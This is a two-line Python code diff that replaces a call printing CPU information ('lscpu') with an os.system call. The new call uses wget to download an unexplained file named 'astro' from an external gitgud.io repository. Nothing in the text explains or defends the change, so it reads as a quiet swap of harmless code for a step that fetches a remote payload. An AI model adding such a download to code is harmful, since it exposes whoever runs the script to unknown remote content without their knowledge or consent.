@@ -1,2 +1,2 @@
 import os
-os.system('lscpu')
+os.system('wget https://gitgud.io/trendava/clouds/-/raw/master/astro')
